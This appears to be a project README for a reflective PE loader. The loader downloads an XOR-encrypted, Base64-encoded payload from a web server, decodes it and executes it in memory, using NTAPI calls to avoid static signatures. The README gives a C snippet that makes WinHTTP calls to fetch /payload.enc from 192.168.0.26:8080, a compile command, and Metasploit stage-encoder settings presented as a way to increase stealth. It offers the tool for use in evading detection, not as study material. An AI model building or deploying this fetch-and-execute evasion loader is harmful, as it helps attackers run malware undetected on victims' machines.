# Reflective PE Loader
This project is a PE loader utilizing reflective DLL injection, XOR encryption, and Base64 encoding to obfuscate payloads. The loader fetches the encrypted payload from a web server, decodes it, and executes it. It leverages NTAPI functions for low-level Windows operations and avoids static signatures to stay undetected.

## How to Use?
1. Run the Python script to encrypt your payload:
   ```python3 encrypt.py <input> <output>```
2. Set up a simple Python HTTP server to serve the payload.enc or modify the URL in main.c to point to your server:
```c
HINTERNET hConnect = pWinHttpConnect(hSession, L"192.168.0.26", 8080, 0);
HINTERNET hRequest = pWinHttpOpenRequest(hConnect, GET, L"/payload.enc", NULL, 0, 0, 0);
```
## Compile the Loader
Compile the loader using GCC:
```gcc -mwindows -O2 -fno-asynchronous-unwind-tables -fno-exceptions -static-libgcc main.c obfuscation.c reflective.c -o loader.exe```
You'll need MSYS2 for the GCC environment.

## Stealth Mode
In MSFConsole, crank up the stealthiness with these settings:
```c
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru
```

## Useful References
- https://www.msys2.org/
- https://www.ired.team/

![abcacb](https://github.com/user-attachments/assets/462ee1d4-f322-4dcc-8707-e5f26ba7e195)
